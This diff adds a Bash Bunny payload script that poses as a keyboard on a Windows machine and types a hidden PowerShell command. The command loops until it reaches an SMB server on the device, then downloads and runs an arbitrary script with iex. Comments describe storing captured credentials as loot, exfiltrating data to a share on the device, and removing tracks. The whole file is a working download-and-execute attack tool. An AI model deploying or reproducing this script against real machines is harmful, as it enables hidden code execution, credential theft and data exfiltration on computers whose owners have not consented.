@@ -1,0 +1,77 @@
+#!/bin/bash
+#
+# Title:         Powershell Download and Execute SMB
+# Author:        LowValueTarget
+# Version:       2.0
+# Category:      Powershell
+# Target:        Windows XP SP3+ (Powershell)
+# Attackmodes:   HID, RNDIS_ETHERNET
+# Firmware:      >= 1.2
+#
+# Quick HID attack to retrieve and run powershell payload from BashBunny SMBServer. Possibilities are limitless!
+# Credentials captured by  are stored as loot.
+# Ensure p.txt exists in payload directory  (using .txt instead of .ps1 in case of security countermeasures)
+#
+# Required tools: impacket
+#
+# | Attack Stage        | Description                   |
+# | ------------------- | ------------------------------|
+# | Stage 1             | Powershell                    |
+# | Stage 2             | Delivering powershell payload |
+#
+ATTACKMODE RNDIS_ETHERNET HID
+
+# SETUP
+LED SETUP
+REQUIRETOOL impacket # required for SMB server
+
+GET SWITCH_POSITION
+GET TARGET_HOSTNAME
+GET HOST_IP
+
+# DEFINE DIRECTORIES
+PAYLOAD_DIR=/root/udisk/payloads/$SWITCH_POSITION
+LOOTDIR_BB=/root/udisk/loot/psh_DownloadExecSMB
+
+mkdir -p /tmp/{l,p}
+
+# CHECK FOR POWERSHELL
+if [ ! -f ${PAYLOAD_DIR}/p.txt ]; then
+    LED FAIL
+    exit 1
+fi
+cp -R ${PAYLOAD_DIR}/* /tmp/p/ # any additional assets will be available in tmp
+
+# GET HOSTNAME
+HOST=${TARGET_HOSTNAME}
+[[ -z "${HOST}" ]] && HOST="noname"
+COUNT=$(ls -lad ${LOOTDIR_BB}/${HOST}* | wc -l)
+COUNT=$((COUNT+1))
+mkdir -p ${LOOTDIR_BB}/${HOST}-${COUNT}
+LOOTDIR_BB=${LOOTDIR_BB}/${HOST}-${COUNT}
+
+# START SMB SERVER
+LOGFILE=/tmp/l/psh_downloadsmb.log
+touch ${LOGFILE}
+python /tools/impacket/examples/smbserver.py -comment 'Public Share' s /tmp > ${LOGFILE} &
+
+# STAGE 1 - POWERSHELL
+LED STAGE1
+RUN WIN "powershell -WindowStyle Hidden \"while (\$true) {If ((New-Object net.sockets.tcpclient(${HOST_IP},445)).Connected) {iex (New-Object Net.WebClient).DownloadString('\\\\${HOST_IP}\\s\\p\\p.txt');New-Item \\\\${HOST_IP}\\s\\COMPLETE -ItemType file;exit}}\""
+# TIP: To exfil any data, upload to \\172.16.64.1\s\l\ -- this will be copied to the BB as loot
+# TIP: Remove tracks in the psh payload if you wish
+
+# STAGE 2 - HURRY UP AND WAIT
+LED STAGE2
+while ! [ -f /tmp/COMPLETE ]; do sleep 0.5; done
+
+# CLEANUP
+LED CLEANUP
+
+# STASH THE LOOT
+mv /tmp/l/* ${LOOTDIR_BB}/
+rm -rf /tmp/{l,p}
+# Sync file system
+sync
+
+LED FINISH
